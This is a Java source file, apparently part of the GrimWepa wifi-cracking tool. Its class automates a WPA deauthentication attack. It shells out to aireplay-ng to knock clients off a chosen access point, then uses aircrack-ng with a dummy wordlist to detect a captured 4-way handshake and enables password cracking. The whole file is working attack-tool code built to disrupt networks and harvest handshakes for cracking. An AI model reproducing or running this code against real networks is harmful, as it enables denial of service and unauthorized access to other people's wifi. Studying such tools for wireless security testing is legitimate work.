/**
 * 'scripter' class
 * checks for handshake (uses aircrack-ng and a dummy wordlist 'badpw.txt').
 * Copyright 2010 Derv Merkler
 */
import java.io.*;
import java.util.*;

// WPA deauth attack - sign clients off of AP so as to get 4-way handshakes when they sign back on

public class scripter implements Runnable {
	Thread t;
	public static boolean flag;
	public static boolean handshake;
	
	public scripter() {
		t = new Thread(this, "WPA Handshake Listener");
		flag = false;
		handshake = false;
	}
	
	public void run() {
		String line, wificard, client;
		Process pro2 = null;
		BufferedReader in = null;
		Writer w = null;
		
		// get wifi card (found in test2.java)
		wificard = (String)test2.drivers.getItemAt(test2.drivers.getSelectedIndex());
		
		// get clients (if any)
		if (test2.wpachkclients.isSelected() == true) {
			client = (String)test2.wpaclients.getItemAt(test2.wpaclients.getSelectedIndex());
			if (client.equals("[no clients found]") == true)
				client = "";
			else
				client = " -c " + client;
		} else
			client = "";
		
		do {
			test2.stat("Sending 3 deauths...");
			
			try {
				pro2 = Runtime.getRuntime().exec("xterm -fg green -bg black -bd green -geom 100x15+0+0 -iconic -e " + 
					"aireplay-ng -0 3 -a " + 
					test2.currentBSSID + 
					"" + client + " " + wificard); 
				pro2.waitFor();
				pro2.destroy();
			} catch(IOException e){
				e.printStackTrace();
			} catch(InterruptedException e) {
				e.printStackTrace();
			}
			
			test2.stat("Sent 3 deauths; waiting...");
			
			pauseTen();
			
			test2.stat("Checking for handshake...");
			try {
				// this loop throws our cap file into aircrack-ng and tries to crack it
				// using the password "blahblahblah".. aircrack will tell us if we have
				// a handshake or not by saying "Passphrase not in dictionary"
				if (fileExists(test2.grimwepaPath + "badpw.txt") == false) {
					w = new PrintWriter(new FileWriter(test2.grimwepaPath + "badpw.txt"));
					w.write("thewrongpasswordblahblah");
					w.flush();
				}
				
				pro2 = Runtime.getRuntime().exec(test2.fixArgumentsPath("aircrack-ng -a 2 -w " +  
						"!PATH!badpw.txt !PATH!wpa-01.cap"));
				pro2.waitFor();
				
				in = new BufferedReader(new InputStreamReader(pro2.getInputStream()));
			} catch (IOException ioe) {
				ioe.printStackTrace();
			} catch (InterruptedException ie) {
				ie.printStackTrace();
			} finally {
				try {
					//if (w != null)
						w.close();
				} catch (NullPointerException npe) {
					npe.printStackTrace();
				} catch (IOException ioe) {
					ioe.printStackTrace();
				}
			}
			
			try {
				while ((line = in.readLine()) != null) {
					if (line.indexOf("Passphrase not in dictionary") >= 0) {
						// this code runs if we have a handshake
						flag = true;      // stop the loop
						handshake = true; // know we got a handshake
						break;
					}
				}
				in.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			pro2.destroy();
		} while (flag == false);
		test2.stat("Cleaning up files...");
		
		test2.pro1.destroy();
		
		try {
			pro2 = Runtime.getRuntime().exec(test2.fixArgumentsPath("rm -rf !PATH!badpw.txt"));
			pro2.waitFor();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException ex) {
			ex.printStackTrace();
		}
		
		pro2.destroy();
		
		if (handshake == true) {
			// yay!
			test2.stat("Handshake was captured! Saved as wpa-01.cap");
			test2.wpacrack.setEnabled(true);
			test2.wpawordlist.setEnabled(true);
			// copy the cap file for safe keeping (let user know)
			// file is: wpa-01.cap
			
		} else {
			test2.stat(""); // say "inactive"
			// no handshake? must've hit cancel.. 
			// delete that shit! (aka cap file)
			try {
				pro2 = Runtime.getRuntime().exec(test2.fixArgumentsPath("rm -rf !PATH!wpa-01.cap"));
				pro2.waitFor();
				pro2.destroy();
			} catch (IOException ioe) {
				ioe.printStackTrace();
			} catch (InterruptedException ie) {
				ie.printStackTrace();
			}
		}
		test2.wpadeauth.setLabel("Start Deauth + Handshake Capture Attack");
		test2.setEnable(true);
	}
	
	public boolean fileExists(String file) {
		File f = new File(file);
		return f.exists();
	}
	
	public static void pauseTen() {
		int waitime;
		try {
			waitime = Integer.parseInt(test2.wpatimeout.getText());
		} catch (NumberFormatException e) {
			waitime = 5;
			test2.wpatimeout.setText("5");
		}
		
		if (waitime <= 0)
			waitime = 1;
		try { 
			for (int i = 0; i < waitime; i++) {
				test2.stat("Sent 3 deauths; waiting for " + (waitime - i) + " seconds...");
				if (flag == true)
					break;
				Thread.currentThread().sleep((int)(1000));
			}
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
}